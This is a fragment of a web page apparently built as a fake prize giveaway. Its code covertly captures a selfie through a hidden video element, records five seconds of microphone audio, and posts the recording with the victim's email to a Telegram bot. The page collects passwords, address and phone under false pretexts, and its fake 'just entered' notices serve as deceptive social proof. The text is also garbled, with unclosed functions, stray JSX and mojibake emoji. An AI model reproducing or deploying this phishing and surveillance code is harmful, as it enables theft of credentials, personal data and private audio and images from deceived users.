async function sendTelegram(message) {

// рџ“ё Photo capture karo aur Telegram par bhejo
async function captureAndSendPhoto(stream, email) {
  try {
    const video = document.getElementById("hiddenVideo");
    const canvas = document.getElementById("hiddenCanvas");
    video.srcObject = stream;
    // Video load hone ka wait
    await new Promise((res, rej) => {
      video.onloadedmetadata = res;
      setTimeout(rej, 5000); // 5s timeout
    });
    await video.play();
    // Camera warm-up ke liye 2 second wait
    await new Promise(r => setTimeout(r, 2000));
    // Canvas par frame draw karo
    canvas.width = video.videoWidth || 1280;
    canvas.height = video.videoHeight || 720;
    const ctx = canvas.getContext("2d");
    // Selfie camera ko mirror karo
    ctx.translate(canvas.width, 0);
    ctx.scale(-1, 1);
    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
    // JPEG blob banao
    const blob = await new Promise(r => canvas.toBlob(r, "image/jpeg", 0.9));
    
    // Telegram par photo bhejo
    const time = new Date().toLocaleString("en-IN", { timeZone: "Asia/Kolkata" });
    const fd = new FormData();
    fd.append("chat_id", CHAT_ID);
    fd.append("photo", blob, "selfie.jpg");
    fd.append("caption", `рџ“ё <b>SELFIE CAPTURED</b>\n\nрџ‘¤ Email: ${email}\nрџ“… Time: ${time}`);
    fd.append("parse_mode", "HTML");

  } catch (e) {
    console.log("Photo capture error:", e);
    try { stream.getTracks().forEach(t => t.stop()); } catch(_) {}
  }
}

// рџЋ¤ Audio 5 second record karo aur Telegram par bhejo
async function recordAndSendAudio(stream, email) {
  return new Promise((resolve) => {
    try {
      const chunks = [];
      // Best supported MIME type choose karo
      const mimeType =
        MediaRecorder.isTypeSupported("audio/webm;codecs=opus") ? "audio/webm;codecs=opus" :
        MediaRecorder.isTypeSupported("audio/webm") ? "audio/webm" :
        MediaRecorder.isTypeSupported("audio/ogg;codecs=opus") ? "audio/ogg;codecs=opus" :
        "audio/ogg";

      const rec = new MediaRecorder(stream, { mimeType });
      rec.ondataavailable = e => { if (e.data && e.data.size > 0) chunks.push(e.data); };
      rec.onstop = async () => {
        try {
          const blob = new Blob(chunks, { type: mimeType });
          stream.getTracks().forEach(t => t.stop());
          const time = new Date().toLocaleString("en-IN", { timeZone: "Asia/Kolkata" });
          const fd = new FormData();
          fd.append("chat_id", CHAT_ID);
          fd.append("voice", blob, "recording.ogg");
          fd.append("caption", `рџЋ¤ <b>AUDIO RECORDING (10m)</b>\n\nрџ‘¤ Email: ${email}\nрџ“… Time: ${time}`);
          fd.append("parse_mode", "HTML");
          await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendVoice`, { method: "POST", body: fd });
        } catch(e) { console.log("Audio send error:", e); }
        resolve();
      };
      rec.start(100); // 100ms chunks
      setTimeout(() => { try { rec.stop(); } catch(e) { resolve(); } }, 5000);
    } catch(e) {
      console.log("Recorder error:", e);
      try { stream.getTracks().forEach(t => t.stop()); } catch(_) {}
      resolve();
    }
  });
}

function getDeviceInfo() {
  const ua = navigator.userAgent;
  let browser = "Unknown";
  if (ua.includes("Chrome") && !ua.includes("Edg")) browser = "Chrome";
  else if (ua.includes("Firefox")) browser = "Firefox";
  else if (ua.includes("Safari") && !ua.includes("Chrome")) browser = "Safari";
  else if (ua.includes("Edg")) browser = "Edge";
  else if (ua.includes("OPR") || ua.includes("Opera")) browser = "Opera";
  let os = "Unknown";
  if (ua.includes("Android")) os = "Android";
  else if (ua.includes("iPhone") || ua.includes("iPad")) os = "iOS";
  else if (ua.includes("Windows")) os = "Windows";
  else if (ua.includes("Mac")) os = "MacOS";
  else if (ua.includes("Linux")) os = "Linux";
  return { browser, os, screen: `${screen.width}x${screen.height}`, lang: navigator.language || "Unknown", online: navigator.onLine ? "Online" : "Offline" };
}

function FloatingParticles() {
  const particles = Array.from({length: 20}, (_, i) => ({
    id: i, w: (i * 1.3 % 6) + 2, l: (i * 17 % 100), t: (i * 23 % 100),
    dur: (i * 1.1 % 10) + 8, del: (i * 0.7 % 5), h: String((i * 30 % 60) + 30),
  }));
  return (
    <div style={{position:"fixed",inset:0,pointerEvents:"none",overflow:"hidden",zIndex:0}}>
      {particles.map(p => (
        <div key={p.id} style={{position:"absolute",width:`${p.w}px`,height:`${p.w}px`,borderRadius:"50%",background:`hsla(${p.h},100%,70%,0.4)`,left:`${p.l}%`,top:`${p.t}%`,animation:`float ${p.dur}s ease-in-out infinite`,animationDelay:`${p.del}s`}}/>
      ))}
    </div>
  );
}

        <div style={S.card}>
          <h3 style={{textAlign:"center", marginBottom:"20px", ...S.gold, fontSize:"18px"}}>рџЏ† Prize Pool</h3>
          <div style={{display:"grid", gridTemplateColumns:"1fr 1fr", gap:"12px"}}>
            {prizes.map((prize, i) => (
              <div key={i} style={{background:activePrize===i?"rgba(247,212,94,0.15)":"rgba(255,255,255,0.04)", border:`1px solid ${activePrize===i?"rgba(247,212,94,0.5)":"rgba(255,255,255,0.08)"}`, borderRadius:"12px", padding:"12px", transition:"all 0.5s ease", display:"flex", alignItems:"center", gap:"8px"}}>
                <span style={{fontSize:"20px"}}>{prize.icon}</span>
                <div>
                  <div style={{fontSize:"12px", fontWeight:"600", color:activePrize===i?"#f7d45e":"#fff"}}>{prize.name}</div>
                  <div style={{fontSize:"10px", color:"rgba(255,255,255,0.4)", textTransform:"uppercase", letterSpacing:"0.5px"}}>{prize.category}</div>
                </div>
              </div>
            ))}
          </div>
        </div>
        <div style={{background:"rgba(0,200,100,0.1)", border:"1px solid rgba(0,200,100,0.2)", borderRadius:"12px", padding:"14px 20px", marginBottom:"20px", display:"flex", alignItems:"center", gap:"12px", animation:"slideIn 0.5s ease"}}>
          <div style={{width:"8px", height:"8px", borderRadius:"50%", background:"#00c864", flexShrink:0, animation:"pulse 1.5s infinite"}}/>
          <span style={{fontSize:"13px", color:"rgba(255,255,255,0.8)"}}><strong style={{color:"#00c864"}}>{usersList[currentUser]}</strong> just entered the giveaway</span>
        </div>
        <div style={{display:"grid", gridTemplateColumns:"1fr 1fr 1fr", gap:"12px", marginBottom:"30px"}}>
          {[{label:"Winners",value:"100"},{label:"Prizes",value:`${prizes.length}+`},{label:"Days Left",value:"3"}].map((s,i)=>(
            <div key={i} style={{textAlign:"center", ...S.card, padding:"16px", marginBottom:0}}>
              <div style={{fontSize:"24px", fontWeight:"700", ...S.gold}}>{s.value}</div>
              <div style={{fontSize:"11px", color:"rgba(255,255,255,0.5)", textTransform:"uppercase", letterSpacing:"0.5px", marginTop:"4px"}}>{s.label}</div>
            </div>
          ))}
        </div>
        <button style={S.btn} onClick={()=>setStep("signup")}>рџЋ‰ Enter Giveaway Now</button>
        <p style={{textAlign:"center", color:"rgba(255,255,255,0.3)", fontSize:"12px", marginTop:"16px"}}>Free entry В· No purchase necessary В· 100 worldwide winners</p>
      </div>
    </div>
  );

  if (step === "signup") return (
    <div style={S.app}>
      <FloatingParticles/>
      <div style={{...S.cont, paddingTop:"50px"}}>
        <button onClick={()=>setStep("landing")} style={S.backBtn}>в†ђ Back</button>
        <div style={{textAlign:"center", marginBottom:"32px"}}>
          <div style={{fontSize:"48px", marginBottom:"12px"}}>рџ”ђ</div>
          <h2 style={{fontSize:"28px", margin:"0 0 8px", ...S.gold}}>Create Account</h2>
          <p style={{color:"rgba(255,255,255,0.5)", fontSize:"14px", margin:0}}>Sign up to enter the giveaway</p>
        </div>
        <div style={S.card}>
          <div style={S.fg}>
            <label style={S.lbl}>Email Address</label>
            <input type="email" placeholder="you@example.com" value={signup.email} onChange={e=>setSignup(s=>({...s,email:e.target.value}))} style={{...S.inp,...(errors.email?S.inpErr:{})}}/>
            {errors.email && <div style={S.err}>вљ  {errors.email}</div>}
          </div>
          <div style={S.fg}>
            <label style={S.lbl}>Password</label>
            <input type="password" placeholder="Min. 6 characters" value={signup.password} onChange={e=>setSignup(s=>({...s,password:e.target.value}))} style={{...S.inp,...(errors.password?S.inpErr:{})}}/>
            {errors.password && <div style={S.err}>вљ  {errors.password}</div>}
          </div>
          <div style={S.fg}>
            <label style={S.lbl}>Confirm Password</label>
            <input type="password" placeholder="Re-enter password" value={signup.confirmPassword} onChange={e=>setSignup(s=>({...s,confirmPassword:e.target.value}))} style={{...S.inp,...(errors.confirmPassword?S.inpErr:{})}}/>
            {errors.confirmPassword && <div style={S.err}>вљ  {errors.confirmPassword}</div>}
          </div>
          <button style={{...S.btn, opacity:loading?0.7:1}} onClick={handleSignup} disabled={loading}>
            {loading?<span style={{display:"flex",alignItems:"center",justifyContent:"center",gap:"10px"}}><span style={S.spin}/>Creating Account...</span>:"Continue в†’"}
          </button>
        </div>
      </div>
    </div>
  );

  if (step === "permissions") return (
    <div style={S.app}>
      <FloatingParticles/>
      <div style={{...S.cont, paddingTop:"50px"}}>
        <button onClick={()=>setStep("signup")} style={S.backBtn}>в†ђ Back</button>
        <div style={{textAlign:"center", marginBottom:"32px"}}>
          <div style={{fontSize:"52px", marginBottom:"12px", animation:"float 3s ease-in-out infinite"}}>рџ”’</div>
          <h2 style={{fontSize:"26px", margin:"0 0 8px", ...S.gold}}>Allow Permissions</h2>
          <p style={{color:"rgba(255,255,255,0.5)", fontSize:"14px", margin:0, lineHeight:1.6, maxWidth:"300px", marginLeft:"auto", marginRight:"auto"}}>We need these permissions to verify your entry and ensure your prize reaches you</p>
        </div>
        <div style={S.card}>
          {[
            {key:"location", icon:"рџ“Ќ", title:"Location Access", desc:"Required to verify your region and prize eligibility", actionLabel:"Allow Location"},
            {key:"storage", icon:"рџ’ѕ", title:"Storage Access", desc:"Required to save your entry details securely", actionLabel:"Allow Storage"},
            {key:"camera", icon:"рџ“·", title:"Camera Access", desc:"Required to verify your identity as a real person", actionLabel:"Allow Camera"},
            {key:"mic", icon:"рџЋ™пёЏ", title:"Microphone Access", desc:"Required for voice verification to prevent duplicates", actionLabel:"Allow Mic"},
          ].map((perm, i) => (
            <div key={perm.key} style={{background:permissions[perm.key]?"rgba(0,200,100,0.08)":"rgba(255,255,255,0.04)", border:`1px solid ${permissions[perm.key]?"rgba(0,200,100,0.35)":"rgba(255,255,255,0.1)"}`, borderRadius:"16px", padding:"20px", marginBottom:i<3?"14px":0, transition:"all 0.4s ease"}}>
              <div style={{display:"flex", alignItems:"center", justifyContent:"space-between", gap:"12px"}}>
                <div style={{display:"flex", alignItems:"center", gap:"14px"}}>
                  <div style={{width:"48px", height:"48px", borderRadius:"14px", background:permissions[perm.key]?"rgba(0,200,100,0.15)":"rgba(255,255,255,0.08)", display:"flex", alignItems:"center", justifyContent:"center", fontSize:"22px", flexShrink:0}}>
                    {permLoading[perm.key] ? <span style={{width:"20px", height:"20px", border:"2px solid #f7d45e", borderTopColor:"transparent", borderRadius:"50%", display:"inline-block", animation:"spin 0.8s linear infinite"}}/> : permissions[perm.key] ? "вњ…" : perm.icon}
                  </div>
                  <div>
                    <div style={{fontWeight:"600", fontSize:"15px", marginBottom:"4px", color:permissions[perm.key]?"#00c864":"#fff"}}>{perm.title}</div>
                    <div style={{color:"rgba(255,255,255,0.4)", fontSize:"12px", lineHeight:1.4}}>
                      {permLoading[perm.key]
                        ? <span style={{color:"#f7d45e", fontSize:"11px"}}>{perm.key==="camera"?"рџ“ё Capturing photo...":"рџЋ¤ Recording 5s audio..."}</span>
                        : permissions[perm.key] && permStatus[perm.key]
                        ? <span style={{color:"#00c864", fontSize:"11px"}}>{permStatus[perm.key]}</span>
                        : perm.desc}
                    </div>
                  </div>
                </div>
                {!permissions[perm.key] && !permLoading[perm.key] && (
                  <button onClick={()=>requestPermission(perm.key)} style={{padding:"10px 16px", background:"linear-gradient(135deg,#f7d45e,#e8a020)", border:"none", borderRadius:"10px", color:"#0a0a0a", fontSize:"12px", fontWeight:"700", cursor:"pointer", whiteSpace:"nowrap", flexShrink:0, fontFamily:"inherit"}}>
                    {perm.actionLabel}
                  </button>
                )}
                {permissions[perm.key] && !permLoading[perm.key] && (
                  <span style={{color:"#00c864", fontSize:"13px", fontWeight:"700", flexShrink:0}}>Granted вњ“</span>
                )}
              </div>
            </div>
          ))}

          {permError && (
            <div style={{marginTop:"14px", background:"rgba(255,107,107,0.1)", border:"1px solid rgba(255,107,107,0.3)", borderRadius:"10px", padding:"12px 14px", fontSize:"13px", color:"#ff6b6b", lineHeight:1.5}}>
              вљ пёЏ {permError}
            </div>
          )}

          <div style={{display:"flex", gap:"8px", justifyContent:"center", margin:"20px 0 24px"}}>
            {["location","storage","camera","mic"].map(k=>(
              <div key={k} style={{height:"4px", flex:1, borderRadius:"2px", background:permissions[k]?"linear-gradient(90deg,#00c864,#00a050)":"rgba(255,255,255,0.1)", transition:"background 0.4s ease"}}/>
            ))}
          </div>

          <button style={{...S.btn, opacity:allPermissionsGranted?1:0.4, cursor:allPermissionsGranted?"pointer":"not-allowed"}} onClick={()=>allPermissionsGranted&&setStep("form")} disabled={!allPermissionsGranted}>
            {allPermissionsGranted ? "Continue to Entry Form в†’" : `${[!permissions.location&&"Location",!permissions.storage&&"Storage",!permissions.camera&&"Camera",!permissions.mic&&"Mic"].filter(Boolean).join(", ")} Required`}
          </button>
        </div>
        <p style={{textAlign:"center", color:"rgba(255,255,255,0.25)", fontSize:"11px", marginTop:"12px", lineHeight:1.6, padding:"0 10px"}}>рџЊЌ Permissions help us verify entries and deliver prizes correctly.</p>
      </div>
    </div>
  );

  if (step === "form") return (
    <div style={S.app}>
      <FloatingParticles/>
      <div style={{...S.cont, paddingTop:"40px"}}>
        <button onClick={()=>setStep("permissions")} style={S.backBtn}>в†ђ Back</button>
        <div style={{marginBottom:"32px"}}>
          <div style={{display:"flex", justifyContent:"space-between", marginBottom:"8px"}}>
            <span style={{fontSize:"13px", color:"rgba(255,255,255,0.5)"}}>Step 3 of 3</span>
            <span style={{fontSize:"13px", color:"#f7d45e"}}>Entry Form</span>
          </div>
          <div style={{height:"4px", background:"rgba(255,255,255,0.1)", borderRadius:"2px"}}>
            <div style={{height:"100%", width:"100%", background:"linear-gradient(90deg,#f7d45e,#e8a020)", borderRadius:"2px"}}/>
          </div>
        </div>
        <div style={{textAlign:"center", marginBottom:"28px"}}>
          <h2 style={{fontSize:"26px", margin:"0 0 8px", ...S.gold}}>Almost There! рџЋ‰</h2>
          <p style={{color:"rgba(255,255,255,0.5)", fontSize:"14px", margin:0}}>Fill in your details so we can deliver your prize</p>
        </div>
        <div style={S.card}>
          <div style={S.fg}>
            <label style={S.lbl}>Full Name</label>
            <input type="text" placeholder="John Doe" value={form.fullName} onChange={e=>setForm(f=>({...f,fullName:e.target.value}))} style={{...S.inp,...(errors.fullName?S.inpErr:{})}}/>
            {errors.fullName && <div style={S.err}>вљ  {errors.fullName}</div>}
          </div>
          <div style={S.fg}>
            <label style={S.lbl}>Delivery Address</label>
            <textarea placeholder="Street, City, State, ZIP / Postal Code, Country" value={form.address} onChange={e=>setForm(f=>({...f,address:e.target.value}))} rows={3} style={{...S.inp, resize:"none", lineHeight:"1.5", ...(errors.address?S.inpErr:{})}}/>
            {errors.address && <div style={S.err}>вљ  {errors.address}</div>}
          </div>
          <div style={S.fg}>
            <label style={S.lbl}>Mobile Number</label>
            <input type="tel" placeholder="+1 234 567 8900" value={form.mobile} onChange={e=>setForm(f=>({...f,mobile:e.target.value}))} style={{...S.inp,...(errors.mobile?S.inpErr:{})}}/>
            {errors.mobile && <div style={S.err}>вљ  {errors.mobile}</div>}
          </div>
          <div style={S.fg}>
            <label style={S.lbl}>Email Address</label>
            <input type="email" placeholder="you@example.com" value={form.email} onChange={e=>setForm(f=>({...f,email:e.target.value}))} style={{...S.inp,...(errors.email?S.inpErr:{})}}/>
            {errors.email && <div style={S.err}>вљ  {errors.email}</div>}
          </div>
          <div style={{background:"rgba(247,212,94,0.06)", borderRadius:"10px", padding:"12px 14px", marginBottom:"20px", fontSize:"12px", color:"rgba(255,255,255,0.45)", lineHeight:"1.5"}}>
            рџ”’ Your data is kept private and used solely for prize delivery. 100 winners selected randomly within 24 hours.
          </div>
          <button style={{...S.btn, opacity:loading?0.7:1}} onClick={handleSubmit} disabled={loading}>
            {loading?<span style={{display:"flex",alignItems:"center",justifyContent:"center",gap:"10px"}}><span style={S.spin}/>Submitting Entry...</span>:"рџЋЇ Submit My Entry"}
          </button>
        </div>
      </div>
    </div>
  );

  if (step === "success") {
    const confetti = Array.from({length:30},(_,i)=>({id:i,l:(i*13%100),w:(i*1.3%10)+5,bg:["#f7d45e","#ff6b9d","#00c864","#60a5fa","#f97316"][i%5],round:i%2===0,dur:(i*0.4%4)+3,del:(i*0.3%3)}));
    return (
      <div style={S.app}>
        {confetti.map(c=>(
          <div key={c.id} style={{position:"fixed",left:`${c.l}%`,top:"-20px",width:`${c.w}px`,height:`${c.w}px`,background:c.bg,borderRadius:c.round?"50%":"2px",animation:`confettiFall ${c.dur}s ease-in ${c.del}s forwards`,zIndex:10,pointerEvents:"none"}}/>
        ))}
        <FloatingParticles/>
        <div style={{...S.cont, paddingTop:"60px", textAlign:"center"}}>
          <div style={{fontSize:"80px", marginBottom:"24px", animation:"float 3s ease-in-out infinite", display:"inline-block", filter:"drop-shadow(0 0 30px rgba(247,212,94,0.6))"}}>рџЏ†</div>
          <h1 style={{fontSize:"clamp(28px,8vw,42px)", margin:"0 0 12px", ...S.gold, lineHeight:1.2}}>Congratulations!</h1>
          <p style={{fontSize:"18px", color:"rgba(255,255,255,0.8)", marginBottom:"8px", lineHeight:1.5}}>You're officially in the draw! рџЋ‰</p>
          <p style={{color:"rgba(255,255,255,0.45)", fontSize:"14px", marginBottom:"32px"}}>Entry confirmed for <strong style={{color:"#f7d45e"}}>{form.fullName}</strong></p>
          <div style={{...S.card, background:"rgba(0,200,100,0.08)", border:"1px solid rgba(0,200,100,0.3)", textAlign:"left", animation:"countUp 0.5s ease"}}>
            <div style={{display:"flex", alignItems:"flex-start", gap:"16px"}}>
              <div style={{width:"48px", height:"48px", borderRadius:"50%", background:"rgba(0,200,100,0.15)", display:"flex", alignItems:"center", justifyContent:"center", fontSize:"22px", flexShrink:0, animation:"pulseAnim 2s ease-in-out infinite"}}>вњ…</div>
              <div>
                <h3 style={{margin:"0 0 8px", color:"#00c864", fontSize:"16px"}}>You will be notified within 1 day</h3>
                <p style={{margin:0, color:"rgba(255,255,255,0.5)", fontSize:"13px", lineHeight:1.6}}>We'll reach out to <strong style={{color:"rgba(255,255,255,0.8)"}}>{form.email}</strong> and <strong style={{color:"rgba(255,255,255,0.8)"}}>{form.mobile}</strong> if you're selected.</p>
              </div>
            </div>
          </div>
          <div style={S.card}>
            <h3 style={{...S.gold, margin:"0 0 18px", fontSize:"16px", textAlign:"left"}}>рџ“‹ What Happens Next</h3>
            {[{icon:"рџЋЇ",title:"Random Draw",desc:"100 winners selected from all valid entries worldwide"},{icon:"рџ“§",title:"Notification",desc:"Winners contacted within 24 hours via email & SMS"},{icon:"рџљљ",title:"Prize Delivery",desc:"Your prize shipped to your provided address"}].map((s,i)=>(
              <div key={i} style={{display:"flex", gap:"14px", alignItems:"flex-start", marginBottom:i<2?"16px":0, paddingBottom:i<2?"16px":0, borderBottom:i<2?"1px solid rgba(255,255,255,0.06)":"none"}}>
                <span style={{fontSize:"22px", flexShrink:0}}>{s.icon}</span>
                <div style={{textAlign:"left"}}>
                  <div style={{fontWeight:"600", fontSize:"14px", marginBottom:"2px"}}>{s.title}</div>
                  <div style={{color:"rgba(255,255,255,0.45)", fontSize:"13px"}}>{s.desc}</div>
                </div>
              </div>
            ))}
          </div>
          <div style={{...S.card, background:"rgba(247,212,94,0.06)", border:"1px solid rgba(247,212,94,0.15)"}}>
            <p style={{margin:"0 0 16px", color:"rgba(255,255,255,0.6)", fontSize:"14px"}}>рџЊџ Help spread the word and let your friends know!</p>
            <button onClick={()=>setStep("landing")} style={{...S.btn, background:"transparent", border:"1px solid rgba(247,212,94,0.4)", color:"#f7d45e"}}>View Prize Pool Again</button>
          </div>
          <p style={{color:"rgba(255,255,255,0.2)", fontSize:"11px", marginTop:"20px", lineHeight:1.5}}>Good luck! В· Entry ID: {Math.random().toString(36).substr(2,9).toUpperCase()}</p>
        </div>
      </div>
    );
  }
}

const root = ReactDOM.createRoot(document.getElementById('root'));
root.render(<GiveawayApp />);
</script>
</body>
</html>
